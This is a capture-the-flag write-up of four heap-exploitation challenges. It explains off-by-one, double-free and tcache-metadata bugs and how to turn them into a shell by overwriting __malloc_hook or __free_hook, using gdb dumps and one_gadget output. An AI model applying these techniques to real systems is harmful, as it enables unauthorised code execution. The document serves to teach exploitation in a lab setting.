# babyheap

```bash
❯ file babyheap
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=afa4d4d076786b1a690f1a49923d1e054027e8e7, for GNU/Linux 3.2.0, stripped
❯ checksec babyheap
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```
Sooo full protection.

Seems to be a classic heap allocation executable with a menu:
```bash
-----Yet Another Babyheap!-----
[M]alloc 
[F]ree 
[S]how 
[E]xit 
------------------------
Command:
> 
```

## Analysis

### global objects

There seems to be two global object used accross the different functions, one for keeping a list of allocated pointers, the other for showing the size of allocated pointers.

### [M]alloc

There seems to be a bit of logic with the sizing of the allocation. If the requested size is more than `0x178`, it will error out. Else it will either:
* allocate `0xf8` if the requested size was strictly less than `0xf9`
* or else allocate `0x178`
What is suprising is that it keeps the requested size in the size array instead of the actual size of the chunk.

It will also look for the first free entry in the pointer list in order to save the allocated chunk into it. So if I have `0, 1, 2, 3` allocated entries, free `1 & 2`, then allocate one chunk I'll have `0, 1, 3` as allocated entries.

When allocating `0xf8` sized chunks, there seems to be a 1 byte overflow since it will read until it reach `0xf8` with `0` included, which makes it `0xf9` bytes. It will precisely overflow the next chunk on the previous used flag and part of the size.

There can be no more than 10 chunks.

### [F]ree

Free seems to be quite clean:
* it checks the index value (0 <= index < 10)
* it errors out if the address we want to free is null
* put zeros in the region to be freed
* set the pointer to null
* set a boolean for the usage to false

### [S]how

Nothing really pecular here, it will just displays the selected chunk if it exists. Probably useful for the leak.

## Exploit

Looking at the few options we have, we'll probably have to play with the particular sizing strategy with malloc which gives us a single byte overflow.

We're gonna use this single byte overflow in order to play with the size of the chunks. To be more precise, we'll change the size of a freed chunk so that it would spill over another free chunk following it.

I'll try to illustrate it with gdb. First with the setup we need 3 chunks, and free 2 of them so that the last to be freed is just above an allocated one.
```
0x5606c8647290:	0x0000000000000000	0x0000000000000101  <- second freed chunk>
0x5606c86472a0:	0x00005606c86474a0	0x00005606c8647010
[...]
0x5606c8647390:	0x0000000000000000	0x0000000000000101
0x5606c86473a0:	0x6161616161616161	0x6161616161616161
[...]
0x5606c8647490:	0x6161616161616161	0x0000000000000101  <- first freed chunk>
0x5606c86474a0:	0x0000000000000000	0x00005606c8647010
0x5606c86474b0:	0x0000000000000000	0x0000000000000000
```

Then reallocate the last to be freed, and overwrite the header of the next chunk so that it fell in the other category of the allocation (aka chunks of size 0x180).
```
0x5606c8647290:	0x0000000000000000	0x0000000000000101  <- freshly reallocated chunk>
0x5606c86472a0:	0x6262626262626262	0x6262626262626262
[...]
0x5606c8647390:	0x6262626262626262	0x0000000000000180  <- metadata partially overwritten>
0x5606c86473a0:	0x6161616161616161	0x6161616161616161
[...]
0x5606c8647490:	0x6161616161616161	0x0000000000000101  <- first freed chunk>
0x5606c86474a0:	0x0000000000000000	0x00005606c8647010
0x5606c86474b0:	0x0000000000000000	0x0000000000000000
```

Then we free the overwritten chunk, so that it would go in the tcache for the chunks of size 0x180.
```
0x5606c8647290:	0x0000000000000000	0x0000000000000101
0x5606c86472a0:	0x6262626262626262	0x6262626262626262
[...]
0x5606c8647390:	0x6262626262626262	0x0000000000000180  <- freshly freed chunk, metadata partially overwritten>
0x5606c86473a0:	0x0000000000000000	0x00005606c8647010
[...]
0x5606c8647490:	0x0000000000000000	0x0000000000000101  <- first freed chunk>
0x5606c86474a0:	0x0000000000000000	0x00005606c8647010
0x5606c86474b0:	0x0000000000000000	0x0000000000000000
```

Now if we allocate a chunk of size 0x180, we are able to overwrite part of the chunk that was just after it. We do so in order to be able to print the address that was stored in it.
```
0x5606c8647290:	0x0000000000000000	0x0000000000000101
0x5606c86472a0:	0x6262626262626262	0x6262626262626262
[...]
0x5606c8647390:	0x6262626262626262	0x0000000000000180
0x5606c86473a0:	0x6464646464646464	0x6464646464646464
[...]
0x5606c8647490:	0x6464646464646464	0x6464646464646464  <- overwritten header of first freed chunk>
0x5606c86474a0:	0x6464646464646464	0x00005606c8647010
0x5606c86474b0:	0x0000000000000000	0x0000000000000000
```

However this address is not very interesting to leak. In order to have something better, we'll also fill smallbin in order to have a leak to libc. With some adjustements it will look like this:
```
0x5613c366c290:	0x0000000000000000	0x0000000000000101  <- chunk that overwrites size of next>
0x5613c366c2a0:	0x6262626262626262	0x6262626262626262
[...]
0x5613c366c390:	0x6262626262626262	0x0000000000000180  <- overwritten chunk that has been reallocated>
0x5613c366c3a0:	0x6464646464646464	0x6464646464646464
[...]
0x5613c366c490:	0x6464646464646464	0x6464646464646464  <- following chunk (in small bin) with its header erased>
0x5613c366c4a0:	0x00007f144e46ecd0	0x00007f144e46ecd0  <- the leak to libc we wanted ;)>
```

The leak pointing to:
```
gef➤  x 0x00007f144e46ecd0
0x7f144e46ecd0 <main_arena+336>:	0x00007f144e46ecc0
```

The rest of the exploit will revolves around faking a chunk and allocate it in order to have write access anywhere. To do so, we will overwrite size information in tcache in order to create an overlapping chunk in tcache. This overlapping chunk will overwrite a fd address of a freed chunk just after that one. Upon allocation of the chunk with the overwritten fd pointer, we will create a fake freed chunk, pointing wherever we want it to.

We will then only have to allocate it and write anything (say, a gadget) in order to complete our exploit. As per the tutorial, we will write to `__malloc_hook`.

Gadget to write to malloc:
```
❯ one_gadget libc-2.31.so
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

For all of them the conditions were not met (I exit in sigsev), but I have some hopes for the first one. Let's see if we can set r12 to NULL. 

But using a gadget will mean putting two addresses, and the executable will stop at the first null bytes. So I'll have to try something else.

I decided to overwrite `free_hook` instead of `malloc_hook`, in hope that the registers would be in a different state and allow me to launch my exploit. And indeed that worked for me !

# cpp

```bash
❯ file cpp
cpp: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9ccb6196788d9ba1e3953535628a62549f3bcce8, stripped
❯ checksec cpp
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

As for most heap exercises, we can manage some allocated chunks. The main difference being that we store a couple of strings: one dubbed `name`, the other `buf`.

The code reverse engineered by ghidra is more intricate than what I'm used to. So I'll play with the executable while trying to understand the decompiled code. 

By inserting several entries, it seems that there will be different allocations before the executable stores the inputs from the user. Saving 5 items resulted in ~20 memory chunks of different size, the ones corresponding to `buf` grouped in the same area. I deleted one to see how it behaves, and it seems to be leaking an address. I can also see some parial inputs with newlines floating around.

## Adding entry

To add an entry we need to give a name and a buffer. First it will copy the buffer's content into an internal structure, then it will read the name's value.

After reading everything it will delete the buffer, which will become useful.

The program seems to be storing the different entries in a particular memory zone, as we can see in ghidra as `DAT_00303260` (points to beginning of said zone) and `DAT_00303268` (points to end of said zone ?).

For example on one run I had:
```
gef➤  x/2gx 0x55588ba03260
0x55588ba03260:	0x000055588d914e60	0x000055588d914f50
```

And looking there:
```
gef➤  x/100gx 0x000055588d914e60
0x55588d914e60:	0x0000000000000005	0x000055588d9143d0
0x55588d914e70:	0x000055588d914390	0x000000000000002b
0x55588d914e80:	0x000000000000002b	0x0000000000000000
0x55588d914e90:	0x0000000000000100	0x000055588d915100
0x55588d914ea0:	0x000055588d914eb0	0x000000000000000a
0x55588d914eb0:	0x3232323232323232	0x0000000000003232
0x55588d914ec0:	0x0000000000000100	0x000055588d915210
0x55588d914ed0:	0x000055588d914ee0	0x000000000000000a
0x55588d914ee0:	0x3333333333333333	0x0000000000003333
0x55588d914ef0:	0x0000000000000100	0x000055588d9147d0
0x55588d914f00:	0x000055588d914f10	0x000000000000000a
0x55588d914f10:	0x3434343434343434	0x0000000000003434
0x55588d914f20:	0x0000000000000100	0x000055588d9147d0
0x55588d914f30:	0x000055588d914f40	0x000000000000000a
0x55588d914f40:	0x3434343434343434	0x0000000000003434
0x55588d914f50:	0x0000000000000000	0x0000000000000000
0x55588d914f60:	0x0000000000000000	0x0000000000000000
0x55588d914f70:	0x0000000000000000	0x0000000000000000
```

Each entry seems to be 0x30 bytes long, with pointer and length information for both name and buf. If the name is small enough, it seems to copy it in the internal structure of the entry.
```
0x55588d914e60:	0x0000000000000005	0x000055588d9143d0  <buf len, buf ptr>
0x55588d914e70:	0x000055588d914390	0x000000000000002b  <name ptr, name len>
0x55588d914e80:	0x000000000000002b	0x0000000000000000  <name len since too big>
```

And for an entry with a smaller name:
```
0x55588d914e90:	0x0000000000000100	0x000055588d915100  <buf len, buf ptr>
0x55588d914ea0:	0x000055588d914eb0	0x000000000000000a  <name ptr, name len>
0x55588d914eb0:	0x3232323232323232	0x0000000000003232  <name value, e.g. "2222222222">
```

Also, `DAT_00303270` seems to hold the beginning of the memory region containing the big chunks of allocated memory.


## Deleting entry

It seems that upon deletion, there is a portion of code that will build up a string, and regardless of the outcome we delete the last entry.

Indeed even if we delete two different entries it will return a `free(): double free detected in tcache 2`.

## View entry

This option will just display the `buf` part of the selected item.

## Exploit

In the tutorial the author first used the bug in the deletion in order to get a leak, then a double free in order to overwrite `malloc_hook`.

On my setup I was able to reproduce the leak, but unfortunaltly my libc has protection against tcache double free. Indeed, it has this dumb (but effective !) code:
```c
/* This test succeeds on double free.  However, we don't 100%
    trust it (it also matches random payload data at a 1 in
    2^<size_t> chance), so verify it's not an unlikely
    coincidence before aborting.  */
if (__glibc_unlikely (e->key == tcache))
  {
    tcache_entry *tmp;
    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
    for (tmp = tcache->entries[tc_idx];
          tmp;
          tmp = tmp->next)
      if (tmp == e)
        malloc_printerr ("free(): double free detected in tcache 2");
    /* If we get here, it was a coincidence.  We've wasted a
        few cycles, but don't abort.  */
  }
```

I will now try to do the exploit with libc2.27, as the tutorial's author is doing.

As [this site](https://www.fatalerrors.org/a/replace-different-versions-of-libc-when-running-debug-binary.html) explains so well, `LD_PRELOAD` might fail if the dynamically linked `libc.so`'s version doesn't match the one we targeted.

So I went to ubuntu's package list and downloaded [the one for libc](https://ubuntu.pkgs.org/18.04/ubuntu-updates-main-amd64/libc6_2.27-3ubuntu1.4_amd64.deb.html). I extracted it in a folder and patched the `cpp` executable with `patchelf`:
```bash
❯ patchelf --set-interpreter ~/Projects/ubuntuLibs/libc2_27/lib/x86_64-linux-gnu/ld-2.27.so cpp
❯ patchelf --replace-needed libc.so.6 ~/Projects/ubuntuLibs/libc2_27/lib/x86_64-linux-gnu/libc.so.6 cpp
❯ ldd cpp
	linux-vdso.so.1 (0x00007ffe04527000)
	libstdc++.so.6 => /lib/x86_64-linux-gnu/libstdc++.so.6 (0x00007f5da08d5000)
	libgcc_s.so.1 => /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007f5da08ba000)
	./libc.so.6 (0x00007f5da04c9000)
	libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f5da037a000)
	/home/renaud/Projects/ubuntuLibs/libc2_27/lib/x86_64-linux-gnu/ld-2.27.so => /lib64/ld-linux-x86-64.so.2 (0x00007f5da0cd8000)
```

And now I can use `cpp` with an older version of libc !

So what's left is the use of a double free. For this we'll just need to free a chunk twice by using the bug with the deletion where we always delete the last one.

With this we'll acquire a write anywhere, which will be on `__free_hook` in this case. We are going to write a gadget on this hook to pop a shell:
```bash
❯ one_gadget libc-2.27.so
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

I tried to write a pseudo gadget to set the values, to no avail. As the tutorial suggests, I will try to call `system` instead.

The overwrite succeeded, but I was not able to pop a shell. After following a bit the flow of instruction, it seems that the `system` clones a process, and somehow I don't have the control over it.

It's a failure :/

# Popping Cap 1

```bash
❯ file popping_caps
popping_caps: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0b94b47318011a2516372524e7aaa0caeda06c79, not stripped
❯ checksec popping_caps
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Classic heap exercise, with Malloc, Free and Write. Somehow I'm releaved to see a write, since the previous exercise was... tiresome. There is even a system leak on the go !

The program seems to have a counter initialised at 7, which is decremented at each menu entry. Obviously, I have 7 tries to open a shell.

## Malloc

It seems to ask for any size and allocate it. It will then save the address in a variable that lives on the stack.

## Free

Reads a number from the user, and frees anything that is at latest malloc'ed address plus the number from the user. Then under a certain condition it will set a pointer to the heap to null. This might be to prevent us from writing over this freed address, since it is this variable that is used for writing.

Since the delta computation will be relative to the latest malloc'ed address, we'll need to provide a negative delta in order to free previous entries.

## Write

Reads 8 bytes from stdin, and write it a the copied variable, which is supposed to be the latest allocated chunk

## Bye

This method will print `Bye!`, then malloc `0x38` before exiting. It is called if we select option `4`, or if we use up our 7 interactions with the menu. It might be useful if we try to overwrite malloc_hook with our 7 interactions, and need a final malloc to trigger an exploit.

## Exploit

I first tried to double free a chunk in the hope to be able to overwrite an fd pointer before reallocating it.

I then followed the tutorial in order to press forward.

### About tcache

In this exercise, the author explains how libc is bookkeeping the different freed chunks.

With gdb I can see an allocated chunk of about 0x290 bytes before allocating any of the chunks I requested.

Upon closer inspection, we can see some connections with some previous `free` I just did:
```
gef➤  x/100gx 0x0000560732358000
0x560732358000:	0x0000000000000000	0x0000000000000291  <header of the automatically allocated chunk>
0x560732358010:	0x0000000000000003	0x0000000000000000  <counter for chunks of size 0x20>
0x560732358020:	0x0000000000000000	0x0000000000000000
0x560732358030:	0x0000000000000000	0x0000000000000000
0x560732358040:	0x0000000000000000	0x0000000000000000
0x560732358050:	0x0000000000000000	0x0000000000000000
0x560732358060:	0x0000000000000000	0x0000000000000000
0x560732358070:	0x0000000000000000	0x0000000000000000
0x560732358080:	0x0000000000000000	0x0000000000000000
0x560732358090:	0x00005607323582e0	0x0000000000000000  <pointer to last entry in freed chunk of size 0x20>
0x5607323580a0:	0x0000000000000000	0x0000000000000000
0x5607323580b0:	0x0000000000000000	0x0000000000000000
0x5607323580c0:	0x0000000000000000	0x0000000000000000
0x5607323580d0:	0x0000000000000000	0x0000000000000000
0x5607323580e0:	0x0000000000000000	0x0000000000000000
0x5607323580f0:	0x0000000000000000	0x0000000000000000
0x560732358100:	0x0000000000000000	0x0000000000000000
0x560732358110:	0x0000000000000000	0x0000000000000000
0x560732358120:	0x0000000000000000	0x0000000000000000
0x560732358130:	0x0000000000000000	0x0000000000000000
0x560732358140:	0x0000000000000000	0x0000000000000000
0x560732358150:	0x0000000000000000	0x0000000000000000
0x560732358160:	0x0000000000000000	0x0000000000000000
0x560732358170:	0x0000000000000000	0x0000000000000000
0x560732358180:	0x0000000000000000	0x0000000000000000
0x560732358190:	0x0000000000000000	0x0000000000000000
0x5607323581a0:	0x0000000000000000	0x0000000000000000
0x5607323581b0:	0x0000000000000000	0x0000000000000000
0x5607323581c0:	0x0000000000000000	0x0000000000000000
0x5607323581d0:	0x0000000000000000	0x0000000000000000
0x5607323581e0:	0x0000000000000000	0x0000000000000000
0x5607323581f0:	0x0000000000000000	0x0000000000000000
0x560732358200:	0x0000000000000000	0x0000000000000000
0x560732358210:	0x0000000000000000	0x0000000000000000
0x560732358220:	0x0000000000000000	0x0000000000000000
0x560732358230:	0x0000000000000000	0x0000000000000000
0x560732358240:	0x0000000000000000	0x0000000000000000
0x560732358250:	0x0000000000000000	0x0000000000000000
0x560732358260:	0x0000000000000000	0x0000000000000000
0x560732358270:	0x0000000000000000	0x0000000000000000
0x560732358280:	0x0000000000000000	0x0000000000000000
0x560732358290:	0x0000000000000000	0x0000000000000021  <first freed chunk>
0x5607323582a0:	0x0000000000000000	0x0000560732358010
0x5607323582b0:	0x0000000000000000	0x0000000000000021  <chunk freed in second>
0x5607323582c0:	0x00005607323582a0	0x0000560732358010
0x5607323582d0:	0x0000000000000000	0x0000000000000021  <last freed chunk>
0x5607323582e0:	0x00005607323582c0	0x0000560732358010  <pointer to previous, pointer to bookkeeping region (counter)>
0x5607323582f0:	0x0000000000000000	0x0000000000020d11
```

With this bookkeeping information combined with the weird free mechanism in this exercise where we can use a negative delta, I guess we'll have to free the bookkeeping chunk in order to exploit this executable.

BTW the counter goes like this:
* `0x20` chunk:
```
0x55dea8235000:	0x0000000000000000	0x0000000000000291
0x55dea8235010:	0x0000000000000001	0x0000000000000000
0x55dea8235020:	0x0000000000000000	0x0000000000000000
```

* `0x30`, `0x40`, `0x50` chunk:
```
0x55bea4285000:	0x0000000000000000	0x0000000000000291
0x55bea4285010:	0x0001000100010000	0x0000000000000000
0x55bea4285020:	0x0000000000000000	0x0000000000000000
```

So each word seems to hold a counter for 4 different sizes.

* `0x20` chunk twice:
```
0x558ad9930000:	0x0000000000000000	0x0000000000000291
0x558ad9930010:	0x0000000000000002	0x0000000000000000
0x558ad9930020:	0x0000000000000000	0x0000000000000000
```

And it seems to be simply incremented.

However, it seems the space used for each counter is different from 2.31 and 2.27. With 2.31 I'm not able to get a `1` at the right place, so I will try to use libc2.27 instead. (with patchelf)

With libc2.27 I'm able to create a fake chunk, as per the tutorial:
```
0x561a79597000:	0x0000000000000000	0x0000000000000251  <bookkeeping chunk's header, see the size is different from 2.31>
0x561a79597010:	0x0000000000000000	0x0001000000000000  <counter for chunk of size 0x100 (fake one)>
0x561a79597020:	0x0000000000000000	0x0000000000000000
0x561a79597030:	0x0000000000000000	0x0000000000000000
0x561a79597040:	0x0000000000000000	0x0000000000000100  <counter for chunk of size 0x3b0, which we use as a header for a fake chunk>
0x561a79597050:	0x0000000000000000	0x0000000000000000
0x561a79597060:	0x0000000000000000	0x0000000000000000
0x561a79597070:	0x0000000000000000	0x0000000000000000
0x561a79597080:	0x0000000000000000	0x0000000000000000
0x561a79597090:	0x0000000000000000	0x0000000000000000
0x561a795970a0:	0x0000000000000000	0x0000000000000000
0x561a795970b0:	0x0000000000000000	0x0000000000000000
0x561a795970c0:	0x0000561a79597050	0x0000000000000000  <for pointer for linked list>
0x561a795970d0:	0x0000000000000000	0x0000000000000000
...
```
```
gef➤  heap bins
──────────────────────────────── Tcachebins for arena 0x7f567bf75c40 ────────────────────────────────
Tcachebins[idx=14, size=0x100] count=1  ←  Chunk(addr=0x561a79597050, size=0x100, flags=)
```

We will now allocate this chunk, and then write malloc hook's address at its first 8 bytes. It will now look like this:
```
gef➤  x/100gx 0x00005576971b7000
0x5576971b7000:	0x0000000000000000	0x0000000000000251  <bookkeeping chunk's header>
0x5576971b7010:	0x0000000000000000	0x0000000000000000
0x5576971b7020:	0x0000000000000000	0x0000000000000000
0x5576971b7030:	0x0000000000000000	0x0000000000000000
0x5576971b7040:	0x0000000000000000	0x0000000000000100  <fake chunk>
0x5576971b7050:	0x00007f79a16a0c30	0x0000000000000000  <pointer of the next free chunk, which points to malloc_hook>
0x5576971b7060:	0x0000000000000000	0x0000000000000000
0x5576971b7070:	0x0000000000000000	0x0000000000000000
```
And:
```
gef➤  heap bins
──────────────────────────────── Tcachebins for arena 0x7f79a16a0c40 ────────────────────────────────
Tcachebins[idx=0, size=0x20] count=0  ←  Chunk(addr=0x7f79a16a0c30, size=0x7f79a134d790, flags=) 
```

Now all we have to do is allocate this free chunk, write a system address and exit the program (which will call malloc).

We're going to write a onegadget at malloc_hook, which we can choose from:
```
❯ one_gadget libc-2.27.so
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Unfortunatly, it seems that none of the constraints are fullfilled with my host, nor with my ubuntu16.04 VM. I probably need to install one for each version of libc...

Well, at least I grasped the bookkeeping part of tcache, right ?

Anyway I installed a 18.04 VM and it worked ^^

# Popping Cap 2

```bash
❯ file popping_caps
popping_caps: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=486f00d8257955869a248ee43ceb59a72b022095, not stripped
❯ checksec popping_caps
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
❯ ./popping_caps
Here is system 0x7fdd0f96a410
You have 7 caps!
[1] Malloc
[2] Free
[3] Write
[4] Bye
Your choice: 

```

Seems to be the same as the previous one, with the difference that we don't have a malloc in the `bye` method, which we could have used to trigger our exploit.

Also, we are able to write more information for each write (`0xff`). Can we write anything we want in the bookkeeping section ?

Reminder, structure of bookkeeping chunk:
```
0x56355a8d2000:	0x0000000000000000	0x0000000000000251
0x56355a8d2010:	0x0000000000000001	0x0000000000000000  <counter>
0x56355a8d2020:	0x0000000000000000	0x0000000000000000
0x56355a8d2030:	0x0000000000000000	0x0000000000000000
0x56355a8d2040:	0x0000000000000000	0x0000000000000000
0x56355a8d2050:	0x000056355a8d2260	0x0000000000000000  <address>
0x56355a8d2060:	0x0000000000000000	0x0000000000000000
```

So in this exercise we can save some instructions compared to the previous one, since we can write more. As the previous one, we will meddle with the bookkeeping chunk, but with more freedom.

As such, we can easily create a fake chunk to write on free_hook (to write `system`'s address, which is the one that is leaked). All we have to do is then to "free" a "/bin/sh" string, which we can find in libc with a `search-pattern /bin/sh`.